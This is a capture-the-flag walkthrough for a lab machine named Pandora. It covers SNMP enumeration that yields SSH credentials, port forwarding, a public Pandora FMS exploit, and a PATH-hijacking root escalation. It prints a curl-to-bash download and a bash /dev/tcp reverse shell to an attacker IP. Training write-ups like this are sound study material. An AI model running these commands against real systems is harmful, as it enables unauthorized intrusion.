## Pandora

Difficulty: Easy

### User Flag

#### Daniel User

```
rustscan -a 10.10.11.136 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/00fc5966-0e03-4515-ab86-870cbf461649)

![website](https://github.com/b1d0ws/OSCP/assets/58514930/28c14616-f8b3-47c9-90ee-668d927bfaf5)

<br>

The website seems to be protected, the only information we can collect is the domain name as panda.htb.  

We can perform an UDP Scan with nmap to find something interesting.

```
sudo nmap -sU 10.10.11.136 -T4 --top-ports=100
```

![nmapUDP](https://github.com/b1d0ws/OSCP/assets/58514930/e27457cf-ffd2-41ea-9c10-a27556991d58)

<br>

We find port 161, this is related to snmp.

There is some commands that can be used to enumerate this protocol and find credentials. This credentials can be used to login into SSH.

```
# Enumerate communities (dict.txt is a public wordlist commonly used por this)
onesixtyone -c dict.txt 10.10.11.136

# snmapwalk can enumerate the comunnity found before
snmpwalk -c public -v1 10.10.11.136

# To make the results cleaner you can perform this actions
sudo apt install snmp-mibs-downloader
sudo vi /etc/snmp/snmp.conf
comment mibs :$

# A faster way to enumerate snmp is using snmapbulkwalk
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 . > snmpwalk.1

# Other  tool is snmpenum
```

![enumCommunities](https://github.com/b1d0ws/OSCP/assets/58514930/e086fe65-cbec-4026-9586-f99d3e189362)

![snmpwalk](https://github.com/b1d0ws/OSCP/assets/58514930/a2c439e7-84c0-47cd-a5fd-fadd45f969be)

<br>

#### Matt User

Enumerating the machine, inside apache configuration, we find a sudbomain inside /etc/apache2/sites-enabled/pandora.conf.  

To access this website, we need to portfoward port 80 to access on our machine.

```
ssh -L 8000:127.0.0.1:80 daniel@10.10.11.136
```

![pandoraConf](https://github.com/b1d0ws/OSCP/assets/58514930/ca1e4da4-e332-47e9-9a05-ebd74cfb29f8)

![portForwarding](https://github.com/b1d0ws/OSCP/assets/58514930/cb4d0129-791e-4376-9240-f8d808325379)

<br>

The website uses Pandora FMS v7.0NG.742_FIX_PERL2020, that has some vulnerabilities.

![pandoraSite](https://github.com/b1d0ws/OSCP/assets/58514930/4e1ac904-794b-451c-bdb2-2256e81a587d)

<br>

The normal path is to exploit an sqlinjection to steal a session ID, log into the system and get a reverse shell via file upload.  

Since there is [this exploit](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated) that automate this, we will use it.

```
python3 exploit.py -t 127.0.0.1:8000
curl 10.10.14.11/reverse | bash

# reverse
bash -i >& /dev/tcp/10.10.14.11/3333 0>&1
```

![searchExploit](https://github.com/b1d0ws/OSCP/assets/58514930/865a9011-8bd7-4409-beeb-33a935eb89e2)

![gettingRevShell](https://github.com/b1d0ws/OSCP/assets/58514930/0a0a1ccc-0231-4918-bd7e-5ba5ea56f0d9)

<br>

### Root Flag

Create SSH Keys to login as Matt to ease the process.

There is a uncommon SUID bit called /usr/bin/pandora_backup. Running this binary, we see that is using tar.

![pandoraBackup](https://github.com/b1d0ws/OSCP/assets/58514930/a55b4ce5-a8b8-4e07-b918-ea744c9210e6)

![discoveringTar](https://github.com/b1d0ws/OSCP/assets/58514930/b3a0d4e6-64ea-4bad-b94b-4c9e103bb993)

<br>

We can try to do a Path Hijacking assuming the binary is being called in the relative way or transfer the binary to our machine and use "strings" to confirm.  

Just procced with the basics of Path Hijacking creating a tar binary that returns a reverse shell.

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/fdb38459-1ce3-448f-9284-c33ea3419021)
